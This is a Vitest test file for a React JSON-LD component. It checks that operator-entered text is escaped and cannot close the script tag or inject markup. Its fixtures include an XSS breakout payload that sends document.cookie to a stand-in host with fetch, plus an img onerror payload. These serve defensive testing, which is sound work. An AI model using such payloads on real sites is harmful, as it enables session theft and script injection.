/**
 * @vitest-environment jsdom
 */

import { describe, it, expect } from "vitest";
import { render } from "@testing-library/react";
import { JsonLd } from "@/components/json-ld";

/**
 * These schemas carry operator-entered text — van descriptions and SEO
 * descriptions from the admin fleet form, testimonial quotes, the company
 * profile in settings. `JSON.stringify` escapes for JSON, not for HTML, so
 * without the escaping in this component a closing script tag in any of those
 * fields ends the element and turns the rest of the page into markup.
 */

function scriptText(container: HTMLElement): string {
  return container.querySelector('script[type="application/ld+json"]')!.innerHTML;
}

describe("JsonLd", () => {
  it("emits valid, unchanged structured data for ordinary content", () => {
    const schema = {
      "@context": "https://schema.org",
      "@type": "AutoRental",
      name: "XPDX Rentals",
      description: "Long-term cargo van hire from Condell Park, Sydney.",
    };
    const { container } = render(<JsonLd schema={schema} />);

    // The escaping must be transparent to a JSON parser — Google has to read
    // exactly what we meant.
    expect(JSON.parse(scriptText(container))).toEqual(schema);
  });

  it("neutralises a closing script tag in operator-entered text", () => {
    // Assembled rather than written inline so this file cannot itself be
    // mangled by an editor or bundler that reacts to the literal sequence.
    const close = "</" + "script>";
    const hostile = `${close}<script>fetch("https://evil.example?c="+document.cookie)</script>`;

    const { container } = render(
      <JsonLd schema={{ "@type": "Vehicle", description: hostile }} />,
    );

    const text = scriptText(container);

    // The sequence that would break out of the tag must not survive.
    expect(text).not.toContain(close);
    expect(text).not.toContain("<script>");
    // ...and the value still round-trips intact, so the data is not corrupted.
    expect(JSON.parse(text).description).toBe(hostile);
    // Only one script element — no injected sibling.
    expect(container.querySelectorAll("script")).toHaveLength(1);
  });

  it("escapes HTML comment sequences too", () => {
    const { container } = render(
      <JsonLd schema={{ note: "<!-- <img src=x onerror=alert(1)> -->" }} />,
    );
    const text = scriptText(container);

    expect(text).not.toContain("<!--");
    expect(text).not.toContain("<img");
  });

  it("escapes the JavaScript line terminators that are legal in JSON", () => {
    // U+2028/U+2029 parse fine as JSON but terminate a line in JavaScript, so
    // any consumer that evaluates rather than parses breaks on them. Built from
    // char codes, never written literally — they would terminate a line in this
    // file too.
    const LS = String.fromCharCode(0x2028);
    const PS = String.fromCharCode(0x2029);
    const note = `a${LS}b${PS}c`;

    const { container } = render(<JsonLd schema={{ note }} />);
    const text = scriptText(container);

    expect(text).not.toContain(LS);
    expect(text).not.toContain(PS);
    expect(JSON.parse(text).note).toBe(note);
  });

  it("renders one script per schema when given an array", () => {
    const { container } = render(<JsonLd schema={[{ a: 1 }, { b: 2 }]} />);
    expect(container.querySelectorAll('script[type="application/ld+json"]')).toHaveLength(2);
  });
});
